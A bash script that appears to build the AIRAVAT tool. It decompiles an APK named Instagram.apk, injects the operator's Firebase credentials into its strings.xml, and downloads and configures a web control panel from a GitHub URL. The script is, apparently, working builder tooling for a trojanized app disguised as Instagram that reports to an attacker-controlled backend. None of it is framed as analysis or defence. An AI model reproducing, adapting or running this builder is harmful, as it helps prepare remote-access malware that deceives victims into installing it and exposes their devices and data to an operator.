#!/bin/bash
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'

web() 
{
if [[ -e $PWD/AIRAVAT/"WEB PANEL"/index.html ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}"WEB PANEL" found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}WEB PANNEL missing...${clear}"
fi
}

const() 
{
if [[ -e $PWD/const.txt ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}"const.txt" found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}const.txt missing...${clear}"
fi
}

json() 
{
if [[ -e $PWD/google-services.json ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}"google-services.json" found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}google-services.json missing...${clear}"
fi
}

insta() 
{
if [[ -e $PWD/AIRAVAT/"ANDROID APP"/Instagram.apk ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Instagram.apk found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}Instagram.apk missing...${clear}"
fi
}

decompile() 
{
echo -e "[${Green}✔${clear}] ${Yellow}Decompiling apk...${clear}"
apktool d $PWD/AIRAVAT/"ANDROID APP"/Instagram.apk > /dev/null
echo -e "[${Green}✔${clear}] ${Yellow}Done...${clear}"
}

strings() 
{
if [[ -e $PWD/Instagram/res/values/strings.xml ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}strings.xml found${clear}"
else
echo -e "[${Green}X${clear}] ${Red}strings.xml missing...${clear}"
fi
}

addingjson()
{
firebase_url=$(cat google-services.json |grep 'firebase_url\|current_key\|mobilesdk_app_id\|storage_bucket\|project_id'|sed 's/^[ \t]*//;s/[ \t]*$//'|sed -n '1p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')

project_id=$(cat google-services.json |grep 'firebase_url\|current_key\|mobilesdk_app_id\|storage_bucket\|project_id'|sed 's/^[ \t]*//;s/[ \t]*$//'|sed -n '2p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')

storage_bucket=$(cat google-services.json |grep 'firebase_url\|current_key\|mobilesdk_app_id\|storage_bucket\|project_id'|sed 's/^[ \t]*//;s/[ \t]*$//'|sed -n '3p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')

mobilesdk_app_id=$(cat google-services.json |grep 'firebase_url\|current_key\|mobilesdk_app_id\|storage_bucket\|project_id'|sed 's/^[ \t]*//;s/[ \t]*$//'|sed -n '4p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')

current_key=$(cat google-services.json |grep 'firebase_url\|current_key\|mobilesdk_app_id\|storage_bucket\|project_id'|sed 's/^[ \t]*//;s/[ \t]*$//'|sed -n '5p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
sleep 3
#$PWD/Instagram/res/values/strings.xml
echo -e "[${Green}✔${clear}] ${Yellow}Database added...${clear}"
sed -i "s#https://DATABASE URL#$firebase_url#g" $PWD/Instagram/res/values/strings.xml
sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Project id added...${clear}"
sed -i "s#DATABASE URL#$project_id#g" $PWD/Instagram/res/values/strings.xml
sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Bucket id added...${clear}"
sed -i "s#BUCKET URL#$storage_bucket#g" $PWD/Instagram/res/values/strings.xml
sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}APP ID added...${clear}"
sed -i "s#APP ID#$mobilesdk_app_id#g" $PWD/Instagram/res/values/strings.xml
sleep 3
sed -i "s#API KEY#$current_key#g" $PWD/Instagram/res/values/strings.xml

curl https://raw.githubusercontent.com/efxtv/EFX-Tv-Bookmarks/main/bin/Airavat/index.html -s >AIRAVAT/"WEB PANEL"/index.html
sleep 4
#sed -i "s/foreground=.*/foreground=$MediumVioletRed/g" $HOME/.termux/colors.properties
two=$(cat const.txt |sed -n '2p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
three=$(cat const.txt |sed -n '3p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
four=$(cat const.txt |sed -n '4p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
five=$(cat const.txt |sed -n '5p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
six=$(cat const.txt |sed -n '6p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
seven=$(cat const.txt |sed -n '7p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
eight=$(cat const.txt |sed -n '8p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
nine=$(cat const.txt |sed -n '9p'|sed 's#"# #g;s#,##g'|awk '{print $NF}')
sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Database added...${clear}"
sed -i "s#apienter#$two#g" AIRAVAT/"WEB PANEL"/index.html

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
sed -i "s#authenter#$three#g" AIRAVAT/"WEB PANEL"/index.html

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
sed -i "s#databaseenter#$four#g" AIRAVAT/"WEB PANEL"/index.html

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
sed -i "s#projectenter#$five#g" AIRAVAT/"WEB PANEL"/index.html

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
sed -i "s#storageenter#$six#g" AIRAVAT/"WEB PANEL"/index.html

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
sed -i "s#messsagenter#$seven#g" AIRAVAT/"WEB PANEL"/index.html

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
sed -i "s#appidenter#$eight#g" AIRAVAT/"WEB PANEL"/index.html

sleep 3
echo -e "[${Green}✔${clear}] ${Yellow}Ok...${clear}"
sed -i "s#masureenter#$nine#g" AIRAVAT/"WEB PANEL"/index.html

}
web
sleep 0.5
const
sleep 0.5
json
sleep 0.5
insta
sleep 0.5
decompile
sleep 0.5
strings
sleep 0.5
addingjson
